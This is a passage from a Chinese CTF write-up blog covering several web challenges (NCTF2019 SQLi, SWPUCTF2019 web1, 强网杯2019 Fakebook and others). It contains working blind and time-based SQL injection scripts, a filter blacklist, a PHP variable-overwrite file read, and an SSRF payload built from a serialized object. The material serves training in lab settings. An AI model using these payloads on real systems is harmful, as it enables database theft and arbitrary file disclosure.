class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&quot;http://acbcc15b-d8f2-48b3-9c67-3b16b465068f.node3.buuoj.cn/index.php&quot;</span></span><br><span class="line">flag = <span class="string">&quot;Nu1L&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">target = <span class="string">&quot;select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=database()&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> high &gt; low:</span><br><span class="line">        mid = (high + low) &gt;&gt; <span class="number">1</span></span><br><span class="line">        payload = <span class="string">&quot;2||ascii(substr((&#123;&#125;),&#123;&#125;,1))&gt;&#123;&#125;&quot;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;id&#x27;</span>: payload.format(target, i, mid)</span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.post(url=URL, data=data)</span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">in</span> response.text:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> low != <span class="number">32</span>:</span><br><span class="line">        result += chr(low)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure><p>得到表名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">users23333333333333,f1ag_1s_h3r3_hhhhh</span><br></pre></td></tr></table></figure><p>下面就要实现无列名注入</p><blockquote><p>在知道表名，不知道列名的情况下，我们可以利用<code>union</code>来给未知列名“重命名”，还可以利用报错函数来注入出列名。</p></blockquote><p>这道题再提出一种思路，ascii位偏移大小比较。名字听起来比较玄乎，但是原理很简单：</p><blockquote><p>核心payload：<code>(select 'admin','admin')&gt;(select * from users limit 1)</code></p></blockquote><p>假设flag为flag{bbbbb}，对于payload这个两个select查询的比较，是按位比较的，即先比第一位，如果相等则比第二位，以此类推；在某一位上，如果前者的ASCII大，不管总长度如何，ASCII大的则大，这个不难懂，和c语言的<code>strcmp()</code>函数原理一样，举几个例子：</p><ul><li>glag &gt; flag{bbbbb}</li><li>alag{zzzzzzzzzzz} &lt; flag{bbbbb}</li><li>a &lt; flag{bbbbb}</li><li>z &gt; flag{bbbbb}</li></ul><p>在这样的按位比较过程中，因为在里层的<code>for()</code>循环，字典顺序是从ASCII码小到大来枚举并比较的，假设正确值为b，那么字典跑到b的时候b=b不满足payload的大于号，只能继续下一轮循环，c&gt;b此时满足了，题目返回真，出现了Nu1L关键字，这个时候就需要记录flag的值了，但是此时这一位的char是c，而真正的flag的这一位应该是b才对，所以<code>flag += chr(char-1)</code>，这就是为什么在存flag时候要往前偏移一位的原因。</p><p>另外还需要注意的地方是，字段数一定是一一匹配，这里f1ag_1s_h3r3_hhhhh是有两个字段的(可以用select 1|select 1,2|select 1,2,3试一试)，知道是两个字段后，还要注意字段内的一一对应，f1ag_1s_h3r3_hhhhh表中的flag在第二个字段。</p><p>直接show code：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&quot;http://98ef5288-1d34-4680-a03c-1aa5f5fbfaad.node3.buuoj.cn/index.php&quot;</span></span><br><span class="line">flag = <span class="string">&quot;Nu1L&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">payload = <span class="string">&quot;2||(select 1,&#x27;&#123;&#125;&#x27;)&gt;(select * from f1ag_1s_h3r3_hhhhh)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">200</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">        sleep(<span class="number">0.1</span>)</span><br><span class="line">        char = result + chr(j)</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&#x27;id&#x27;</span>: payload.format(char)</span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.post(URL, data=data)</span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">in</span> response.text:</span><br><span class="line">            result += chr(j - <span class="number">1</span>)</span><br><span class="line">            print(result)</span><br><span class="line">            <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>这样就可以成功的拿到flag。</p><h2 id="GXYCTF2019-BabysqliV3">GXYCTF2019 BabysqliV3</h2><h2 id="NCTF2019-SQLi">NCTF2019 SQLi</h2><h3 id="考点-v10">考点</h3><ul><li>regex盲注</li></ul><p>参考文章：<a href="https://xz.aliyun.com/t/8003">REGEXP注入与LIKE注入</a></p><h3 id="解题-v10">解题</h3><p>hint.txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$black_list &#x3D; &quot;&#x2F;limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|\&#39;|&#x3D;| |in|&lt;|&gt;|-|\.|\(\)|#|and|if|database|users|where|table|concat|insert|join|having|sleep&#x2F;i&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">If $_POST[&#39;passwd&#39;] &#x3D;&#x3D;&#x3D; admin&#39;s password,</span><br><span class="line"></span><br><span class="line">Then you will get the flag;</span><br></pre></td></tr></table></figure><p>找到admin的密码即可得flag</p><p>由于单引号被禁用，使用 \ 转义and前面的那个单引号，使得 <code>'\' and passwd='</code> 形成闭合。构造passwd处为 <code>||/**/passwd/**/regexp/**/&quot;^a&quot;;%00</code>，用regexp查询passwd ^匹配字符串开头 %00截断后面的内容。但是不能在输入框直接提交，会被url encode 变为%2500被黑名单拦截。</p><p>查询语句变为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username&#x3D;&#39;\&#39; and passwd&#x3D;&#39;||&#x2F;**&#x2F;passwd&#x2F;**&#x2F;regexp&#x2F;**&#x2F;&quot;^a&quot;;</span><br></pre></td></tr></table></figure><p>如果regex为真的话，会返回404，否则跳转至登录界面。</p><p>盲注脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;&#x27;&#x27;http://aabb7aa1-f68f-44c7-9e75-514410c6d6f2.node3.buuoj.cn/index.php&#x27;&#x27;&#x27;</span></span><br><span class="line">passwd = <span class="string">&quot;&quot;</span></span><br><span class="line">strs = string.ascii_lowercase + string.digits + <span class="string">&#x27;_&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> strs:</span><br><span class="line">        time.sleep(<span class="number">0.3</span>)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: <span class="string">&#x27;\\&#x27;</span>,</span><br><span class="line">            <span class="string">&quot;passwd&quot;</span>: <span class="string">&#x27;||/**/passwd/**/regexp/**/&quot;^&#123;&#125;&quot;;&#123;&#125;&#x27;</span>.format(passwd+m, parse.unquote(<span class="string">&#x27;%00&#x27;</span>))</span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url, data)</span><br><span class="line">        <span class="keyword">if</span> res.status_code == <span class="number">404</span>:</span><br><span class="line">            passwd += m</span><br><span class="line">            print(passwd)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(passwd)</span><br></pre></td></tr></table></figure><h2 id="SWPUCTF2019-web1">SWPUCTF2019 web1</h2><h3 id="考点-v11">考点</h3><ul><li>十六进制+MySQL预编译绕过</li><li>PHP代码审计</li></ul><h3 id="解题-v11">解题</h3><p>题目只有一个登录框，注册功能未开放，随意填写内容，点击登录，抓包</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200816090843.png" alt=""></p><p>在username字段添加一个单引号PHP会报错</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200816090948.png" alt=""></p><p>而闭合引号后会正常显示。因此可大致确定注入存在，随后开始构造payload。由于题目对username进行了严格的检测，所以无法使用单语句进行注入，但是注入点又存在，于是可以尝试进行堆叠注入。</p><p>不过貌似过滤了绝大多数的关键字，采用16进制+MySQL预处理绕过。原理如下：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200816091925.png" alt=""></p><p>编写时间盲注脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    url = <span class="string">&#x27;&#x27;&#x27;http://71c8375e-74ff-45aa-a2ee-8670864f6b0b.node3.buuoj.cn/index.php?r=Login/Login&#x27;&#x27;&#x27;</span></span><br><span class="line">    payloads = <span class="string">&quot;asd&#x27;;set @a=0x&#123;0&#125;;prepare ctftest from @a;execute ctftest-- -&quot;</span></span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">        <span class="comment"># payload = &quot;select if(ascii(substr((select database()),&#123;0&#125;,1))=&#123;1&#125;,sleep(3),1)&quot;</span></span><br><span class="line">        <span class="comment"># payload = &quot;select if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;ctf&#x27;),&#123;0&#125;,1))=&#123;1&#125;,sleep(3),1)&quot;</span></span><br><span class="line">        <span class="comment"># payload = &quot;select if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27;),&#123;0&#125;,1))=&#123;1&#125;,sleep(3),1)&quot;</span></span><br><span class="line">        payload = <span class="string">&quot;select if(ascii(substr((select flag from flag),&#123;0&#125;,1))=&#123;1&#125;,sleep(3),1)&quot;</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">128</span>):</span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br><span class="line">            datas = &#123;<span class="string">&#x27;username&#x27;</span>: payloads.format(str_to_hex(payload.format(i, j))), <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;test213&#x27;</span>&#125;</span><br><span class="line">            data = json.dumps(datas)</span><br><span class="line">            times = time.time()</span><br><span class="line">            res = requests.post(url=url, data=data)</span><br><span class="line">            <span class="keyword">if</span> time.time() - times &gt;= <span class="number">3</span>:</span><br><span class="line">                flag = flag + chr(j)</span><br><span class="line">                print(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_to_hex</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([hex(ord(c)).replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>) <span class="keyword">for</span> c <span class="keyword">in</span> s])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>最后跑出了一个源代码，进行审计。</p><p>既然是MVC架构，先弄清楚路由</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_REQUEST[<span class="string">&#x27;r&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$r = explode(<span class="string">&#x27;/&#x27;</span>, $_REQUEST[<span class="string">&#x27;r&#x27;</span>]);</span><br><span class="line"><span class="keyword">list</span>($controller,$action) = $r;</span><br><span class="line">$controller = <span class="string">&quot;<span class="subst">&#123;$controller&#125;</span>Controller&quot;</span>;</span><br><span class="line">$action = <span class="string">&quot;action<span class="subst">&#123;$action&#125;</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(class_exists($controller))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(method_exists($controller,$action))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">$action = <span class="string">&quot;actionIndex&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">$controller = <span class="string">&quot;LoginController&quot;</span>;</span><br><span class="line">        $action = <span class="string">&quot;actionIndex&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">    $data = call_user_func(<span class="keyword">array</span>( (<span class="keyword">new</span> $controller), $action));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    header(<span class="string">&quot;Location:index.php?r=Login/Index&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从r参数中获取要访问的Controller以及Action,然后以/分隔开后拼接成完整的控制器名。以Login/Index为例，就是将Login/Index分隔开分别拼接成LoginController以及actionIndex,然后调用LoginController这个类中的actionIndex方法。每个action里面会调用对应的loadView()方法进行模版渲染，然后将页面返回给客户端。若访问的Controller不存在则默认解析Login/Index。</p><p>下面看关键代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">loadView</span>(<span class="params">$viewName =<span class="string">&#x27;&#x27;</span>, $viewData = []</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">$this</span>-&gt;viewPath = BASE_PATH . <span class="string">&quot;/View/<span class="subst">&#123;$viewName&#125;</span>.php&quot;</span>;</span><br><span class="line">   <span class="keyword">if</span>(file_exists(<span class="keyword">$this</span>-&gt;viewPath))</span><br><span class="line">   &#123;</span><br><span class="line">      extract($viewData);</span><br><span class="line">      <span class="keyword">include</span> <span class="keyword">$this</span>-&gt;viewPath;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很明显可以通过extract来覆盖变量，不过现在还不知道需要覆盖什么变量，寻找几个调用loadView的方法，发现一个对<code>$viewData</code>完全可控的地方。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionIndex</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $listData = $_REQUEST;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;loadView(<span class="string">&#x27;userIndex&#x27;</span>,$listData);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>$listData</code>是从REQUEST提取出来的，完全可控。而其对应的/View/userIndex.php中存在一个文件读取。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span>(!<span class="keyword">isset</span>($img_file)) &#123;</span><br><span class="line">     $img_file = <span class="string">&#x27;/../favicon.ico&#x27;</span>;</span><br><span class="line"> &#125;</span><br><span class="line">$img_dir = dirname(<span class="keyword">__FILE__</span>) . $img_file;</span><br><span class="line">$img_base64 = imgToBase64($img_dir);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;&#x27;</span> . $img_base64 . <span class="string">&#x27;&quot;&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure><p>这样，<code>$img_file</code>可通过<code>extract($viewData)</code>变量覆盖漏洞完全控制，而<code>$viewData</code>是受用户控制的完全控制的。所以这里就存在一个任意文件读取漏洞。</p><p>所以访问<code>?r=User/Index&amp;img_file=/../flag.php</code>可直接获取flag.php经base64后的内容。</p><h2 id="强网杯2019-Fakebook">强网杯2019 Fakebook</h2><h3 id="考点-v12">考点</h3><ul><li>源码泄露</li><li>SQL注入</li><li>PHP反序列化</li><li>SSRF</li></ul><h3 id="题解">题解</h3><p>有robots.txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: &#x2F;user.php.bak</span><br></pre></td></tr></table></figure><p>访问一下拿到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $age = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> $blog = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$name, $age, $blog</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (<span class="keyword">int</span>)$age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = $blog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params">$url</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        $output = curl_exec($ch);</span><br><span class="line">        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>($httpCode == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $blog = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, $blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>第一眼看上去就很像是SSRF漏洞利用，但是始终绕不过<code>isValidBlog</code>函数中的正则表达式</p><p>走一下网站的流程</p><p>注册了账号</p><p>访问个人界面时</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;111.198.29.45:53095&#x2F;view.php?no&#x3D;1</span><br></pre></td></tr></table></figure><p>输入no=9</p><p>有报错信息，泄露了目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Notice: Trying to get property of non-object in &#x2F;var&#x2F;www&#x2F;html&#x2F;view.php on line 53</span><br></pre></td></tr></table></figure><p>看一下有没有sql注入，手工注失败了，有waf。</p><p>看了一下师傅们的wp,发现是waf把union select给过滤了，用/**/内联注释来绕过。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200620150734.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#爆表</span><br><span class="line">no&#x3D;-1+union&#x2F;**&#x2F;select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema&#x3D;database() </span><br><span class="line">#爆列</span><br><span class="line">no&#x3D;-1+union&#x2F;**&#x2F;select 1,group_concat(column_name),3,4 from information_schema.columns where table_schema&#x3D;database()</span><br><span class="line">#爆列data的内容</span><br><span class="line">no&#x3D;-1+union&#x2F;**&#x2F;select 1,group_concat(data),3,4 from users</span><br></pre></td></tr></table></figure><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200620151058.png" alt=""></p><p>data里的内容就是我们之前注册用户的序列化数据，报错信息暗示我们需要构造一个序列化对象</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unserialize(): Error at offset 0 of 1 bytes in &lt;b&gt;&#x2F;var&#x2F;www&#x2F;html&#x2F;view.php&lt;&#x2F;b&gt; on line 31</span><br></pre></td></tr></table></figure><p>这里提交了一个no的参数，返回了用户信息这个页面，所以不难猜到服务器端是通过分析no参数，再从数据库中进行查询，然后返回我们的信息，之前sql注入时得到了服务器再查询时是查询了4个字段，而我们得到的可用的字段有[no,username,passwd,data]四个字段。</p><p>毋庸置疑的是我们的注册信息是写入了数据库的，而no,username,passwd三个字段均没有我们注册时候填写的blog地址，只有data字段中有一个序列化后的blog属性的值。那么返回的页面中的bolg地址是怎么查询的? 或者说怎么得到的？就是通过查询data字段,得到其中的序列化信息来渲染整个页面，从而恰好得到页面中的username,age,blog值。</p><p>猜想到这个逻辑之后,我们就可以通过修改查询的序列化对象的值来构造ssrf请求,从而读取到flag文件</p><p>利用前面泄露的源码构造一个恶意对象</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span>  </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $age = <span class="number">233</span>;</span><br><span class="line">    <span class="keyword">public</span> $blog = <span class="string">&quot;file:///var/www/html/flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$data = <span class="keyword">new</span> UserInfo();</span><br><span class="line"><span class="keyword">echo</span> serialize($data);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>利用getBlogContents调用的curl进行SSRF攻击，四个参数都试了一下，发现是第4个用来读用户数据的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload&#x3D;?no&#x3D;-1 union&#x2F;**&#x2F;select 1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:4:&quot;test&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:29:&quot;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;;&#125;&#39;</span><br></pre></td></tr></table></figure><p>在iframe中得到flag。</p><h3 id="非预期解">非预期解</h3><p>源码没有过滤load_file函数，可以直接包含一个文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?no&#x3D;0+unIon&#x2F;**&#x2F;select+1,load_file(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&#39;),1,1</span><br></pre></td></tr></table></figure><blockquote><p>load_file使用条件：</p><p>1.用户有很高的权限</p><p>2.知道文件的绝对路径</p></blockquote><h2 id="BJDCTF-2nd-简单注入">BJDCTF 2nd 简单注入</h2><h3 id="考点-v13">考点</h3><ul><li>MySQL盲注</li><li>Python脚本编写</li></ul><h3 